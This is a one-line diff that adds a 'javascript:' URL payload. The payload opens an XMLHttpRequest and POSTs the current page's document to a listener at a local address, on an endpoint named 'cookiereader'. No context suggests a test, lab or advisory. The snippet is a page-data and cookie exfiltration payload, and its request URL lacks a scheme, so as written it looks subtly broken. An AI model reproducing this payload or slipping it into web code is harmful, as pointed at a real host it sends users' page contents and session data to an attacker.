@@ -1,0 +1,1 @@
+javascript:var%20X=new%20XMLHttpRequest();X.open('POST','127.0.0.1:23456/cookiereader',false);X.send(document)
